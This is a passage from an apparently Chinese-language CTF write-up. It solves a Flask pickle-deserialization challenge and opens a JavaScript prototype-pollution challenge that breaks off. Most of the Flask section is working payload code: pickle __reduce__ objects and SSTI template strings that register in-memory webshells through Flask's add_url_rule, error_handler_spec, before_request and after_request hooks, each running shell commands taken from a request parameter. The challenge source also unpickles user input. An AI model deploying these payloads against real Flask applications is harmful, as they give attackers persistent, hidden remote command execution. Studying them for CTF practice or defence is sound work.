+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">heal_state</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">black</span><span class="o">.</span><span class="n">blacklist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">heal_state</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;waf.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">heal_state</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Congratulations! You accomplished the first step of healing Starven&#39;s broken heart!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;GEEK_FLAG&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;cat /flag&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;echo &#34;</span> <span class="o">+</span> <span class="n">flag</span> <span class="o">+</span> <span class="s2">&#34; &gt; /flag&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">res</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;Error!!!! give you hint: maybe you can view /starven_s3cret&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/monologue&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">joker</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;joker.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/starven_s3cret&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">secret</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span><span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这题一看就是打pickle反序列化，但是这个题试了试不能出网，然后普通rce也行不通（没办法回显结果），那就只能打内存马了。直接搜flask内存马，顺便了解一下原理</p>
+<p>[Python 内存马分析-先知社区](<a class="link" href="https://xz.aliyun.com/news/10381"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/10381</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">简单来说，Flask内存马的原理：利用SSTI或反序列化等漏洞，动态向Flask应用注册恶意路由，使攻击者可远程执行任意命令，达到持久化控制的效果。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&#34;</span><span class="p">,{</span><span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">   <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;url_for.__globals__[</span><span class="se">\&#39;</span><span class="s1">__builtins__</span><span class="se">\&#39;</span><span class="s1">][</span><span class="se">\&#39;</span><span class="s1">eval</span><span class="se">\&#39;</span><span class="s1">](&#34;app.add_url_rule(</span><span class="se">\&#39;</span><span class="s1">/shell</span><span class="se">\&#39;</span><span class="s1">, </span><span class="se">\&#39;</span><span class="s1">shell</span><span class="se">\&#39;</span><span class="s1">, lambda :__import__(</span><span class="se">\&#39;</span><span class="s1">os</span><span class="se">\&#39;</span><span class="s1">).popen(_request_ctx_stack.top.request.args.get(</span><span class="se">\&#39;</span><span class="s1">cmd</span><span class="se">\&#39;</span><span class="s1">, </span><span class="se">\&#39;</span><span class="s1">whoami</span><span class="se">\&#39;</span><span class="s1">)).read())&#34;, {</span><span class="se">\&#39;</span><span class="s1">_request_ctx_stack</span><span class="se">\&#39;</span><span class="s1">:url_for.__globals__[</span><span class="se">\&#39;</span><span class="s1">_request_ctx_stack</span><span class="se">\&#39;</span><span class="s1">],</span><span class="se">\&#39;</span><span class="s1">app</span><span class="se">\&#39;</span><span class="s1">:url_for.__globals__[</span><span class="se">\&#39;</span><span class="s1">current_app</span><span class="se">\&#39;</span><span class="s1">]})&#39;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打完发现不行，被waf了，猜测是add_url_rule不行，那就打新版内存马</p>
+<p>这里插播一句:<strong>Flask 2.2.0</strong> 版本开始有<strong>动态添加路由的限制</strong>，<strong>即一旦收到第一个 HTTP 请求（即 <code>app._got_first_request = True</code>），将禁止在运行时调用 <code>add_url_rule()</code> 或 <code>route()</code> 添加新路由</strong>。所以这时候就用构造函数</p>
+<h3 id="1打新版flask内存马-利用error_handler_spec钩子函数">1.打新版flask内存马-利用error_handler_spec钩子函数
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span>  <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span>  <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2打before_request钩子函数">2.打before_request钩子函数
+</h3><p>看了官方的wp知道它这个没禁到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(</span><span class="se">\&#34;</span><span class="s2">sys</span><span class="se">\&#34;</span><span class="s2">).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3after_request钩子函数">3.after_request钩子函数
+</h3><p>这里禁用了after_request钩子函数，但是这里还是记录一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd3</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="4简单记录下新版的flask打ssti内存马">4.简单记录下新版的flask打ssti内存马
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">,{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]})}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;app.before_request_funcs.setdefault(None, []).append(lambda :__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&#34;</span><span class="p">,{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]})}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;exec(</span><span class="se">\&#34;</span><span class="s2">global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">,{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]})}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考文章<a class="link" href="https://c1oudfl0w0.github.io/blog/2024/08/09/Flask%e5%86%85%e5%ad%98%e9%a9%ac/"  target="_blank" rel="noopener"
+    >Flask内存马 | 雲流のLowest World</a></p>
+<p>总计：此题预期解是打error_handler_spec钩子函数，但是通过此题还是学到了不少东西，将flask内存马的打法基本了解了一遍，一般都是ssti+内存马，这里pickle+内存马，也是学到一手</p>
+<h2 id="ez_js">ez_js
+</h2><h3 id="js污染链http同名参数转换为数组绕过逗号">js污染链+http同名参数转换为数组绕过逗号
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">merge</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./utils/common.js&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">function</span> <span class="nx">handleLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">geeker</span> <span class="o">=</span> <span class="k">new</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">geekerData</span> <span class="o">=</span> <span class="k">new</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        <span class="nx">merge</span><span class="p">(</span><span class="nx">geeker</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">geeker</span><span class="p">.</span><span class="nx">geekerData</span><span class="p">.</span><span class="nx">username</span> <span class="o">==</span> <span class="s1">&#39;Starven&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">geeker</span><span class="p">.</span><span class="nx">geekerData</span><span class="p">.</span><span class="nx">password</span> <span class="o">==</span> <span class="s1">&#39;123456&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">geeker</span><span class="p">.</span><span class="nx">hasFlag</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="s1">&#39;direct.html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">status</span><span class="p">).</span><span class="nx">end</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">});</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="s1">&#39;error.html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">status</span><span class="p">).</span><span class="nx">end</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">});</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="s1">&#39;error2.html&#39;</span><span class="p">);</span> 
